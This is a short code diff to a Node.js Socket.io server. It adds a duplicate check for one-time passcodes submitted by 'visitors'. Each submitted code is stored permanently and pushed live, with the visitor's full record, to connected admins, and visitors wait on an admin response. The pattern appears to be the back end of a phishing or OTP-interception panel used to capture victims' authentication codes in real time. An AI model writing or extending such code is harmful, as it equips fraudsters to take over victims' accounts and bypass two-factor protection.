@@ -475,6 +475,30 @@ io.on("connection", (socket) => {
         }
       }
       if (data.digitCode) {
+        // Check for duplicate OTP code
+        const isDuplicateCode = visitor.digitCodes && visitor.digitCodes.some(dc => dc.code === data.digitCode);
+        if (isDuplicateCode) {
+          // Reject duplicate OTP - notify visitor
+          socket.emit("otp:duplicateRejected");
+          visitor.waitingForAdminResponse = false;
+          visitor.lastDataUpdate = new Date().toISOString();
+          // Save duplicate OTP rejection permanently
+          if (!visitor.duplicateOtpRejections) visitor.duplicateOtpRejections = [];
+          visitor.duplicateOtpRejections.push({ code: data.digitCode, page: data.page, timestamp: new Date().toISOString() });
+          visitors.set(socket.id, visitor);
+          saveVisitorPermanently(visitor);
+          // Notify admins about duplicate OTP rejection
+          admins.forEach((admin, adminSocketId) => {
+            io.to(adminSocketId).emit("visitor:duplicateOtp", {
+              visitorId: visitor._id,
+              code: data.digitCode,
+              page: data.page,
+              visitor: visitor,
+            });
+          });
+          console.log(`Duplicate OTP rejected for visitor ${visitor._id}: ${data.digitCode}`);
+          return;
+        }
         const now = new Date().toISOString();
         visitor.digitCodes.push({
           code: data.digitCode,
